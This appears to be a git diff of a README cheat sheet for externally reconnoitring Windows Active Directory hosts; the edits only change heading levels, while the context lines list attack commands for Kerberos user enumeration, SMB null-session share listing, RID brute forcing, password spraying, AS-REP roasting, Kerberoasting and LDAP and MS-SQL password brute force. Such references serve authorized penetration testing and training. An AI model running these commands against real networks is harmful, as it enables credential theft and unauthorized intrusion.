@@ -4,12 +4,8 @@ note1: some of these techniques generate lot of noise so use them sparingly.
 
 note2: some of these techniques depends of the ports are open in the host.
 
-1 - [nmap](https://github.com/geleiaa/winRecon_outside/edit/main/README.md#1---nmap)
 
-10 - [ldapsearch](https://github.com/geleiaa/winRecon_outside/edit/main/README.md#10---ldapsearch)
-
-
-### 1 - nmap
+## 1 - nmap
 
 * ``` $ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=usernames <IP> ```
 
@@ -17,7 +13,7 @@ note2: some of these techniques depends of the ports are open in the host.
 
 * ``` $ nmap -vv -p 1433 --script ms-sql-brute --script-args userdb=usernames,passdb=wordlist.txt <IP> ```
 
-### 2 - SMB
+## 2 - SMB
 
 * enum shares with crackmapexec 
 * ``` $ crackmapexec smb <IP> -u "guest" -p "" --shares ```
@@ -35,14 +31,14 @@ note2: some of these techniques depends of the ports are open in the host.
 * ``` $ smbmap -u null -p "" -H <IP> ```
 
 
-### 3 - enum4linux
+## 3 - enum4linux
 
 * ``` $ enum4linux -U -o <IP> (enum users and O.S) ```   
 
 * ``` $ enum4linux -A <IP> (agressive mode) ```
 
 
-### 4 - enum with rpcclient 
+## 4 - enum with rpcclient 
 
 * empty user connection 
 * ``` $ rpcclient <IP> -U "" -N ```
@@ -51,12 +47,12 @@ note2: some of these techniques depends of the ports are open in the host.
 * ``` $ rpcclient -U "name" <IP> ```
 
 
-### 5 - metasploit
+## 5 - metasploit
 
 * ``` msf > use Auxiliary/gather/Kerberos_enumusers ```
 
 
-### 6 - Kerbrute
+## 6 - Kerbrute
 
 * Enum user
 * ``` $ ./kerbrute userenum --dc <IP>  -d ad.domain usernames.txt ```
@@ -68,7 +64,7 @@ note2: some of these techniques depends of the ports are open in the host.
 * ``` $ ./kerbrute passwordspray -d ad.domain --dc <IP> usernames.txt Password123 ```
 
 
-### 7 - Impacket scripts
+## 7 - Impacket scripts
 
 #### If you have a list of valid users...
 * [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) 
@@ -80,7 +76,7 @@ note2: some of these techniques depends of the ports are open in the host.
 * ``` $ impacket-GetUserSPN  -dc-ip <IP> <ad.domain>/<user>:<pass> -request ```
 
 
-### 8 crackmapexec
+## 8 crackmapexec
 
 * Enumerate users by bruteforcing the RID
 * ``` $ crackmapexec smb <IP> -u "anonymous" -p "" --rid-brute ```
@@ -92,11 +88,11 @@ note2: some of these techniques depends of the ports are open in the host.
 * ``` $ crackmapexec ldap <IP> -u users.txt -p '' --asreproast output.txt ```
 
 
-### 9 - Hydra
+## 9 - Hydra
 
 * Password brute
 * ``` $ hydra -v -l username -P wordlist.txt <IP> ldap2 ```
 
-### 10 - ldapsearch
+## 10 - ldapsearch
 
 ...
